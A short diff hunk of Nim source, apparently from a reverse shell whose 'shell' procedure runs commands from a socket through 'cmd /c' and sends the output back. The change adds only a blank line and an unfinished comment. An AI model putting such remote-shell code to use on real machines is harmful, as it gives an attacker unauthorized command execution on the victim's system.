@@ -19,6 +19,8 @@ proc shell(listener: string, port: int): void =
                     break
                 let result = execProcess("cmd /c " & cmd)
                 socket.send(result)
+
+        #THIS WILL
         except:
             raise
         finally:
